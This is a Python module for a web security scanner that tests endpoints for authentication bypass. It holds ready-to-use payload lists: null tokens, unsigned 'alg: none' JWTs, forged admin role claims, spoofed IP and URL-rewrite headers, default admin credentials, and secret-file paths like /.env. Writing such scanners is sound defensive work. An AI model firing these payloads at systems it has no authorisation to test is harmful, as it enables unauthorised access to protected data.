"""
AuthBypassScanner — detects authentication/authorization bypasses.

Tests:
- null/undefined token acceptance
- alg: none JWT bypass
- role claim manipulation in JWTs
- header-based access bypass (X-Original-URL, X-Rewrite-URL, etc.)
- HTTP method override (GET to DELETE, etc.)

Maturity: Level 2 (Detect + Validate)
"""

import base64
import json
from urllib.parse import urlparse

from models.finding import Finding
from modules.utils import (
    safe_get, finding, log, Colors, _build_curl,
)
from scanners.base import ScannerBase


NULL_TOKEN_VARIANTS = [
    "null", "undefined", "none", "0", "false", "guest", "anonymous",
    "", "Bearer null", "Bearer undefined", "Bearer ",
]

JWT_NONE_ALG_PAYLOADS = [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",
    "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.",
    "eyJhbGciOiJub25lIn0.",
]

ROLE_MANIPULATION_CLAIMS = [
    {"role": "admin"}, {"roles": ["admin"]},
    {"role": "administrator"}, {"user_type": "admin"},
    {"is_admin": True}, {"isAdmin": True},
    {"group": "administrators"}, {"groups": ["administrators"]},
    {"role": "superadmin"}, {"permissions": ["*"]},
    {"scope": "admin"}, {"access": "admin"},
]

HEADER_BYPASS_SET = [
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-ProxyUser-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("Client-IP", "127.0.0.1"),
    ("Forwarded", "for=127.0.0.1;by=127.0.0.1"),
    ("X-Auth-Token", "admin"),
    ("Authorization", "Basic YWRtaW46YWRtaW4="),
]

SENSITIVE_PATHS = [
    "/admin", "/administrator", "/admin/", "/api/admin",
    "/api/v1/admin", "/api/v2/admin",
    "/dashboard", "/api/dashboard",
    "/users", "/api/users", "/api/v1/users",
    "/config", "/api/config", "/api/v1/config",
    "/internal", "/api/internal",
    "/debug", "/api/debug",
    "/.env", "/.git/config", "/actuator",
]


class AuthBypassScanner(ScannerBase):
    SCANNER_NAME = "auth_bypass"
    SCANNER_MATURITY = 2
    TARGET_LEVEL = True

    def _build_jwt(self, header: dict, payload: dict) -> str:
        def _b64(data: dict) -> str:
            raw = json.dumps(data, separators=(",", ":")).encode()
            return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
        return f"{_b64(header)}.{_b64(payload)}."

    def _get_protected_paths(self) -> list[str]:
        paths = SENSITIVE_PATHS[:]
        for url in self.recon.get("urls", []):
            parsed = urlparse(url)
            path = parsed.path.rstrip("/")
            if path and len(path) > 3 and path not in paths:
                paths.append(path)
        return paths

    def _is_protected(self, url: str) -> bool:
        resp = safe_get(self.session, url, self.timeout, raise_for_status=False,
                        allow_redirects=False)
        if not resp:
            return False
        if resp.status_code in (401, 403):
            return True
        if resp.status_code in (302, 301):
            loc = resp.headers.get("Location", "")
            if any(kw in loc.lower() for kw in ("login", "auth", "signin", "sso")):
                return True
        return False

    def _test_null_token(self, url: str) -> None:
        auth_headers = ["Authorization", "X-Auth-Token", "X-API-Key", "Token"]
        for header in auth_headers:
            for token in NULL_TOKEN_VARIANTS:
                alt_headers = {header: token}
                resp = safe_get(self.session, url, self.timeout,
                                headers=alt_headers, raise_for_status=False)
                if resp and resp.status_code == 200:
                    f_dict = finding(
                        "Auth Bypass - Null/Empty Token",
                        url, "critical",
                        f"Endpoint accepted '{header}: {token[:50]}' "
                        f"(HTTP {resp.status_code})",
                        f"Header '{header}' with token '{token[:50]}' "
                        f"returned HTTP {resp.status_code}",
                        verification_stage="validated",
                        parameter=header,
                        response_excerpt=(resp.text or "")[:500],
                        steps_to_reproduce=[
                            f"Send request to {url} with {header}: {token[:40]}",
                            f"Observe HTTP {resp.status_code} response — "
                            "auth bypass confirmed",
                            "This means any unauthenticated user can access "
                            "this endpoint",
                        ],
                    )
                    if f_dict:
                        self._add_finding(f_dict)
                        log(f"  [AuthBypass NullToken] {header}:{token[:20]} "
                            f"@ {url[:60]}", Colors.RED,
                            verbose_only=True, verbose=self.verbose)
                    return

    def _test_jwt_none_algorithm(self, url: str) -> None:
        for jwt_body in JWT_NONE_ALG_PAYLOADS:
            resp = safe_get(self.session, url, self.timeout,
                            headers={"Authorization": f"Bearer {jwt_body}"},
                            raise_for_status=False)
            if resp and resp.status_code == 200:
                f_dict = finding(
                    "Auth Bypass - JWT alg: none",
                    url, "critical",
                    "JWT endpoint accepted a token with 'alg: none' — "
                    "signature is not verified",
                    f"JWT header 'alg: none' accepted by {url} (HTTP {resp.status_code})",
                    verification_stage="validated",
                    response_excerpt=(resp.text or "")[:500],
                    steps_to_reproduce=[
                        f"Send request to {url} with Authorization: "
                        f"Bearer {jwt_body[:60]}...",
                        "This JWT has 'alg: none' — no signature required",
                        f"Server returned HTTP {resp.status_code}, "
                        "confirming the unsigned token was accepted",
                        "An attacker can forge arbitrary user identities",
                    ],
                )
                if f_dict:
                    self._add_finding(f_dict)
                    log(f"  [AuthBypass JWT alg:none] @ {url[:60]}",
                        Colors.RED, verbose_only=True, verbose=self.verbose)
                return

    def _test_role_manipulation(self, url: str) -> None:
        for claim in ROLE_MANIPULATION_CLAIMS:
            for payload_key in ("admin", "role", "is_admin"):
                if payload_key in claim:
                    break
            else:
                continue
            jwt = self._build_jwt(
                {"alg": "HS256", "typ": "JWT"},
                {"sub": "attacker", **claim},
            )
            resp = safe_get(self.session, url, self.timeout,
                            headers={"Authorization": f"Bearer {jwt}"},
                            raise_for_status=False)
            if resp and resp.status_code == 200:
                f_dict = finding(
                    "Auth Bypass - Role Manipulation",
                    url, "critical",
                    f"JWT role claim manipulation succeeded: "
                    f"{json.dumps(claim)} accepted by {url}",
                    f"JWT with claims {json.dumps(claim)} accepted "
                    f"(HTTP {resp.status_code})",
                    verification_stage="validated",
                    response_excerpt=(resp.text or "")[:500],
                    steps_to_reproduce=[
                        f"Create JWT with claims: {json.dumps(claim)}",
                        f"Send to {url} with Authorization: "
                        f"Bearer <jwt>",
                        f"Server returned HTTP {resp.status_code}, "
                        "confirming role escalation",
                        "An attacker can escalate privileges by "
                        "modifying JWT claims",
                    ],
                )
                if f_dict:
                    self._add_finding(f_dict)
                    log(f"  [AuthBypass RoleManip] {url[:60]}",
                        Colors.RED, verbose_only=True, verbose=self.verbose)
                return

    def _test_header_bypass(self, url: str) -> None:
        for header_name, header_val in HEADER_BYPASS_SET:
            resp = safe_get(self.session, url, self.timeout,
                            headers={header_name: header_val},
                            raise_for_status=False)
            if resp and resp.status_code == 200:
                f_dict = finding(
                    "Auth Bypass - Header Injection",
                    url, "high",
                    f"Access bypass using '{header_name}: {header_val}' "
                    f"(HTTP {resp.status_code})",
                    f"Header '{header_name}: {header_val}' granted access "
                    f"to {url}",
                    verification_stage="validated",
                    parameter=header_name,
                    response_excerpt=(resp.text or "")[:500],
                    steps_to_reproduce=[
                        f"Send GET to {url} with header "
                        f"'{header_name}: {header_val}'",
                        f"Observe HTTP {resp.status_code} — access granted",
                        "This header bypasses authentication/authorization",
                    ],
                )
                if f_dict:
                    self._add_finding(f_dict)
                    log(f"  [AuthBypass Header] {header_name}: {header_val} "
                        f"@ {url[:60]}", Colors.RED,
                        verbose_only=True, verbose=self.verbose)
                return

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        paths = self._get_protected_paths()
        log(f"[*] AuthBypass: testing {len(paths)} endpoint(s) for "
            f"auth bypass", Colors.CYAN,
            verbose_only=True, verbose=self.verbose)

        base = self.base_url.rstrip("/")
        for path in paths[:30]:
            url = f"{base}{path}"
            if not self._in_scope(url):
                continue
            if not self._is_protected(url):
                continue
            log(f"  [AuthBypass] Testing {url[:70]}", Colors.CYAN,
                verbose_only=True, verbose=self.verbose)
            self._test_null_token(url)
            self._test_jwt_none_algorithm(url)
            self._test_role_manipulation(url)
            self._test_header_bypass(url)

        return self._get_findings()
